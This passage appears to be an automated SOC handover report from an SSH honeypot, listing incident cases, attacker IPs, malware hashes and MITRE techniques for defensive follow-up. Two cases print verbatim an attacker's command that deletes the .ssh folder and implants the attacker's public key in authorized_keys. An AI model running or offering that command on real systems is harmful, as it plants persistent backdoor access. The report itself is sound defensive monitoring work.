**Recommended Actions:**
- [ ] Submit `185.227.153[.]14` to AbuseIPDB if not already reported
- [ ] Block `185.227.153[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb76078bde44

| Field | Detail |
|---|---|
| **Source IP** | `36.69.147[.]255` |
| **First Seen** | 2026-04-08 22:32 |
| **Last Seen** | 2026-04-08 22:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 22:32:49` | `cowrie.session.connect` |
| `2026-04-08 22:32:49` | `cowrie.client.version` |
| `2026-04-08 22:32:49` | `cowrie.client.kex` |
| `2026-04-08 22:32:49` | `cowrie.login.success` |
| `2026-04-08 22:32:49` | `cowrie.session.params` |
| `2026-04-08 22:32:49` | `cowrie.command.input` |
| `2026-04-08 22:32:49` | `cowrie.command.failed` |
| `2026-04-08 22:32:49` | `cowrie.log.closed` |
| `2026-04-08 22:32:50` | `cowrie.session.params` |
| `2026-04-08 22:32:50` | `cowrie.command.input` |
| `2026-04-08 22:32:50` | `cowrie.session.file_download` |
| `2026-04-08 22:32:50` | `cowrie.log.closed` |
| `2026-04-08 22:32:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.69.147[.]255` to AbuseIPDB if not already reported
- [ ] Block `36.69.147[.]255` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0356445a8b13

| Field | Detail |
|---|---|
| **Source IP** | `36.69.147[.]255` |
| **First Seen** | 2026-04-08 22:32 |
| **Last Seen** | 2026-04-08 22:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 22:32:51` | `cowrie.session.connect` |
| `2026-04-08 22:32:51` | `cowrie.client.version` |
| `2026-04-08 22:32:52` | `cowrie.client.kex` |
| `2026-04-08 22:32:52` | `cowrie.login.success` |
| `2026-04-08 22:32:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.69.147[.]255` to AbuseIPDB if not already reported
- [ ] Block `36.69.147[.]255` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6445a45ae7cb

| Field | Detail |
|---|---|
| **Source IP** | `36.69.147[.]255` |
| **First Seen** | 2026-04-08 22:34 |
| **Last Seen** | 2026-04-08 22:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 22:34:35` | `cowrie.session.connect` |
| `2026-04-08 22:34:35` | `cowrie.client.version` |
| `2026-04-08 22:34:35` | `cowrie.client.kex` |
| `2026-04-08 22:34:36` | `cowrie.login.success` |
| `2026-04-08 22:34:36` | `cowrie.session.params` |
| `2026-04-08 22:34:36` | `cowrie.command.input` |
| `2026-04-08 22:34:36` | `cowrie.command.failed` |
| `2026-04-08 22:34:36` | `cowrie.log.closed` |
| `2026-04-08 22:34:36` | `cowrie.session.params` |
| `2026-04-08 22:34:36` | `cowrie.command.input` |
| `2026-04-08 22:34:36` | `cowrie.session.file_download` |
| `2026-04-08 22:34:36` | `cowrie.log.closed` |
| `2026-04-08 22:34:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.69.147[.]255` to AbuseIPDB if not already reported
- [ ] Block `36.69.147[.]255` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc1c2f52e24a

| Field | Detail |
|---|---|
| **Source IP** | `36.69.147[.]255` |
| **First Seen** | 2026-04-08 22:34 |
| **Last Seen** | 2026-04-08 22:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 22:34:38` | `cowrie.session.connect` |
| `2026-04-08 22:34:38` | `cowrie.client.version` |
| `2026-04-08 22:34:38` | `cowrie.client.kex` |
| `2026-04-08 22:34:38` | `cowrie.login.success` |
| `2026-04-08 22:34:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.69.147[.]255` to AbuseIPDB if not already reported
- [ ] Block `36.69.147[.]255` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `89.39.121[.]13` | **25** | 2026-04-08 20:41 | 2026-04-08 21:19 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `36.69.147[.]255` | **4** | 2026-04-08 22:28 | 2026-04-08 22:34 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.32[.]130` | **3** | 2026-04-08 21:51 | 2026-04-08 21:55 | 2m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.36.104[.]242` | 1 | 2026-04-08 21:44 | 2026-04-08 21:45 | 61s | 1 | `T1110.001` | 🟢 LOW |
| `120.48.39[.]73` | 1 | 2026-04-08 22:25 | 2026-04-08 22:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `158.180.79[.]132` | 1 | 2026-04-08 20:41 | 2026-04-08 20:41 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `182.61.148[.]217` | 1 | 2026-04-08 20:43 | 2026-04-08 20:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.227.153[.]14` | 1 | 2026-04-08 22:28 | 2026-04-08 22:28 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `35.216.189[.]16` | 1 | 2026-04-08 20:48 | 2026-04-08 20:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `36.104.147[.]6` | 1 | 2026-04-08 22:26 | 2026-04-08 22:26 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `39.117.79[.]36` | 1 | 2026-04-08 22:25 | 2026-04-08 22:25 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `52.187.9[.]8` | 1 | 2026-04-08 22:24 | 2026-04-08 22:24 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `36.69.147[.]255` | ID | PT TELKOM INDONESIA | **100** ⚠️ | 1 |
| `185.227.153[.]14` | HK | Navox co.,Ltd | **100** ⚠️ | 3 |
| `158.180.79[.]132` | KR | oracle | **100** ⚠️ | 5 |
| `182.61.148[.]217` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 44 |
| `120.48.39[.]73` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `89.39.121[.]13` | DE | play2go.cloud - Cheap and reliable hosting | **100** ⚠️ | 8 |
| `35.216.189[.]16` | CH | Google LLC | **100** ⚠️ | 50 |
| `52.187.9[.]8` | SG | Microsoft Corporation | **100** ⚠️ | 50 |
| `39.117.79[.]36` | KR | SK Broadband Co Ltd | **100** ⚠️ | 45 |
| `101.36.104[.]242` | JP | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 73 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 37 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 34 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 17 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 17 |

---

## 🔕 False Positive Summary (1 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 10 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 76 cases |
| Tool 34  | Credential Extractor        | ✅ 71 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 13 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 1 filtered (1.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 10 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 34 priority case(s) shown individually · 12 recon entry/entries in table (3 group(s) consolidating 32 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-08T22:37:19Z_
